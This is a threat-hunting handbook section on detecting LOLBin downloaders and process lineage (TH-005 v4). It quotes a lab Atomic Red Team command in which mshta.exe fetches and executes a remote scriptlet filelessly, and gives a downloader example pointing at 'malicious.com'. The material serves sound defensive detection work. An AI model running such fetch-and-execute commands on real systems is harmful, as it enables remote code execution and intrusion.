...
> **Author:** Ala Dabat · **Last Updated:** 2026-07-01 · **Status:** Production-Ready · **Version:** 2.0  
...
10. [TH-005 v4 — Bidirectional Lineage Enhancement](#10-th-005-v4--bidirectional-lineage-enhancement)
11. [Engineering Rule vs Hunt Overlap — Summary Doctrine](#11-engineering-rule-vs-hunt-overlap--summary-doctrine)
...
## 10. TH-005 v4 — Bidirectional Lineage Enhancement

> **Updated:** 2026-07-01 · **Status:** Production-Ready · **Rule file:** `hunts/TH-005/TH-005-v4-lineage.kql`

### 10.1 Why v3 Was Insufficient

TH-005 v3 answered one question: *"Is this process a novel downloader?"* It looked in one direction only — from the actor outward to its download behaviour. It was blind to two equally important signal paths:

- What malicious LOLBin **parent** spawned the actor?
- What **child** did the actor spawn after the download completed?

In the validated mshta.exe finding, the telemetry showed:

```
cmd.exe → mshta.exe → javascript:a=GetObject("script:https://...T1218.005.sct").Exec()
```

v3 caught `mshta.exe` as a novel downloader (when not in `KnownLOLBins`). It was completely blind to what `mshta.exe` spawned after execution — which is where the payload lands and C2 begins. That post-download execution chain is often the highest-confidence signal of the three.

### 10.2 The Three-Direction Architecture

```mermaid
flowchart TD
    subgraph D1["DIRECTION 1 — Novel Downloader (v3 logic)"]
        D1A["DeviceProcessEvents\nProcessCommandLine has_any HTTP/FTP keywords\nFileName NOT in KnownLOLBins"]
        D1B["Rarity: NeverSeenBefore\nvs 90-day baseline\nSignalType: D1_NOVEL_DOWNLOADER"]
        D1A --> D1B
    end

    subgraph D2["DIRECTION 2 — Malicious Parent Novel Child (NEW)"]
        D2A["DeviceProcessEvents\nInitiatingProcessFileName in MaliciousParents\ne.g. cmd.exe wscript.exe mshta.exe"]
        D2B["Rarity: child process NeverSeenBefore\nspawned by this parent in baseline\nSignalType: D2_MALICIOUS_PARENT_NOVEL_CHILD"]
        D2A --> D2B
    end

    subgraph D3["DIRECTION 3 — LOLBin Novel Spawn (NEW)"]
        D3A["DeviceProcessEvents\nInitiatingProcessFileName in KnownLOLBins\ne.g. mshta.exe bitsadmin.exe certutil.exe"]
        D3B["Rarity: child process NeverSeenBefore\nspawned by this LOLBin in baseline\nSignalType: D3_LOLBIN_NOVEL_SPAWN"]
        D3A --> D3B
    end

    Union["union Direction1, Direction2, Direction3\nHuntAlert per finding\nRouterUpdateRequired per finding"]

    D1B --> Union
    D2B --> Union
    D3B --> Union

    style D1 fill:#11171a,stroke:#5fd1c7,color:#cdd8db
    style D2 fill:#11171a,stroke:#e8a23d,color:#cdd8db
    style D3 fill:#11171a,stroke:#d9614f,color:#cdd8db
    style Union fill:#243036,stroke:#5fd1c7,color:#cdd8db
```

### 10.3 What Each Direction Catches

| Signal | Direction | What it surfaces | Engineering rule coverage |
|---|---|---|---|
| `D1_NOVEL_DOWNLOADER` | Actor fetching HTTP content not in vocabulary | `desktopimgdownldr.exe https://malicious.com` | Partial — router catches named LOLBins only |
| `D2_MALICIOUS_PARENT_NOVEL_CHILD` | Known bad parent spawning unexpected child | `cmd.exe → mshta.exe` (novel child relationship) | Partial — router has SuspiciousParents but no child rarity |
| `D3_LOLBIN_NOVEL_SPAWN` | LOLBin spawning child it has never spawned before | `mshta.exe → powershell.exe → C2 beacon` | Near-zero — post-download execution chains rarely covered |

D3 is where this hunt produces the most unique value not covered by any existing engineering rule in most environments. It requires correlating two process events across time — expensive to operationalise as a continuous detection, but straightforward as a periodic hunt.

### 10.4 Overlap With Engineering Rules — The Quality Gate

```mermaid
flowchart LR
    subgraph ER["Engineering Rules"]
        ER1["ROUTER: mshta in SuspiciousParents"]
        ER2["ROUTER: TargetProcs named LOLBins"]
        ER3["COMPOSITE: T1218.005 MSHTA (candidate)"]
    end

    subgraph Hunt["TH-005 v4"]
        H1["D1: novel downloader\n(baseline-relative)"]
        H2["D2: malicious parent\nnovel child"]
        H3["D3: LOLBin novel\nspawn"]
    end

    subgraph Outcome["Overlap Meaning"]
        O1["AGREE → validation\nEngineering rule confirmed"]
        O2["HUNT ONLY → detection gap\nComposite rule candidate"]
    end
    ...
    style O2 fill:#2a1a1a,stroke:#d9614f,color:#d9614f
    style O1 fill:#1a2a1a,stroke:#5fd1c7,color:#cdd8db
```

**The overlap is intentional and healthy.** When the hunt fires on something the engineering rule also catches, that is a validation signal — the hunt logic is confirmed sound. When the hunt fires on something the engineering rule misses, that is a detection gap — a composite rule candidate. The `RouterUpdateRequired` and `CompositeUpdateRequired` output fields are the formal handoff mechanism between the two layers.

### 10.5 Kill Chain Evidence — mshta.exe T1218.005

The validated kill chain from ADX telemetry (Atomic Red Team T1218.005, VM-Lab 2026-01-09):

```
Timestamp: 2026-01-09 12:46:10
Parent:     cmd.exe
Actor:      mshta.exe
CommandLine: mshta.exe javascript:a=GetObject("script:https://raw.githubusercontent.com/
             redcanaryco/atomic-red-team/master/atomics/T1218.005/src/T1218.005.sct")
             .Exec();close();
Account:    LabUser
Device:     VM-Lab
```
...
| Component | Meaning |
|---|---|
| `mshta.exe` | Microsoft HTML Application host — legitimate Windows binary |
| `javascript:` | Inline JavaScript execution — no file needed on disk |
| `a=GetObject(...)` | COM object instantiation — fetches remote resource |
| `script:https://...` | Remote SCT (scriptlet) file — executed in memory |
| `T1218.005.sct` | Atomic Red Team test scriptlet — simulates real malware delivery |
| `.Exec();close();` | Executes the scriptlet payload, closes mshta |

This is a fully fileless execution chain — nothing lands on disk between the initial `mshta.exe` invocation and payload execution. The only detectable artefact is the process creation event with the inline JavaScript command line, which is exactly what TH-005 D1 surfaces.

No child process rows were found in the telemetry (`mshta.exe` as `InitiatingProcessFileName` returned zero rows). This is a **telemetry gap** — the Atomic Red Team simulation either did not generate child process events or they were not captured in the MDE schema tables. In a production environment with full MDE sensor coverage, D3 would fire on whatever `mshta.exe` spawned after the scriptlet executed.

### 10.6 v3 → v4 Design Decisions

| Decision | v3 | v4 | Rationale |
|---|---|---|---|
| **Lineage depth** | One direction (actor as downloader) | Three directions (actor as downloader, child, parent) | Catch post-download execution chain |
| **KnownLOLBins role** | Exclusion list for D1 only | Exclusion list for D1 + trigger list for D3 | Same vocabulary serves both purposes |
| **MaliciousParents list** | Used only in HuntAlert tier logic | Drives D2 signal independently | Makes D2 a first-class signal not a scoring modifier |
| **Download keywords** | HTTP/FTP/download terms | Added `getobject`, `script:`, `javascript:` | mshta-specific inline execution patterns |
| **SignalType field** | Absent | D1 / D2 / D3 per row | Analyst knows which direction fired without reading full query |
| **Union architecture** | Single query path | Three let-bound subqueries unioned | Each direction independently tunable without breaking others |

### 10.7 Updated Validated Findings Table

| Hunt | Finding | Direction | Alert | Dataset |
|---|---|---|---|---|
| TH-005 v3 | `mshta.exe` novel downloader | D1 | CRITICAL | VM-Lab / AT T1218.005 |
| TH-005 v4 D2 | `mshta.exe` novel child of `cmd.exe` | D2 | CRITICAL | VM-Lab / AT T1218.005 |
| TH-005 v4 D3 | Post-download spawn chain | D3 | CRITICAL (pending data) | Requires full MDE sensor coverage |

### 10.8 Updated TaHiTI Finalize

| Output | Action | Status |
|---|---|---|
| Detection Engineering | Add `mshta.exe` to router `TargetProcs` | Required |
| Detection Engineering | File `COMPOSITE_T1218.005_MSHTA_DOWNLOAD` composite candidate | Required |
| Detection Engineering | Add `javascript:` and `script:` to router download keywords | Required |
| CTI | T1218.005 HTA fileless execution confirmed in environment | Documented |
| Backlog | D3 validation requires full MDE sensor data — schedule re-run with production telemetry | Pending |
| Next hunt | TH-002 Kerberoasting — `IdentityDirectoryEvents` | Queued |

### 10.9 Rule Files

| Version | File | Status | Description |
|---|---|---|---|
| v1 | `rules/router/ROUTER_INGRESS_TOOL_TRANSFER.kql` | Production | Named LOLBin router |
| v2 | `hunts/TH-005/TH-005-basic.kql` | Superseded | Single-direction rarity hunt |
| v3 | `hunts/TH-005/TH-005-final.kql` | Superseded by v4 | Single-direction + lint fixes |
| v4 | `hunts/TH-005/TH-005-v4-lineage.kql` | **Current** | Bidirectional lineage + lint fixes |

---

## 11. Engineering Rule vs Hunt Overlap — Summary Doctrine

The three-direction architecture of TH-005 v4 makes the overlap question explicit enough to state as doctrine:

> **Overlap between a hunt and an engineering rule is not duplication — it is independent confirmation from a different signal path. A hunt that never overlaps any engineering rule is probably not hunting in the right place. A hunt that only overlaps existing rules is not finding anything new.**

The correct operating model is:

1. Hunt fires on X using baseline rarity
2. Engineering rule fires on X using named vocabulary
3. Both agree → engineering rule confirmed, hunt validated
4. Hunt fires on Y, engineering rule misses Y → detection gap found
5. Y becomes a composite rule candidate via `CompositeUpdateRequired` directive
6. Hunt updates `KnownDumpTools` / `KnownLOLBins` to exclude Y on next run
7. Hunt re-runs looking for Z

This is the PEAK Act with Knowledge feedback loop operating correctly. The hunt's vocabulary exclusion list (`KnownDumpTools`, `KnownLOLBins`) is not a suppression list — it is the **boundary marker** between what detection engineering already owns and what the hunt is still responsible for finding.
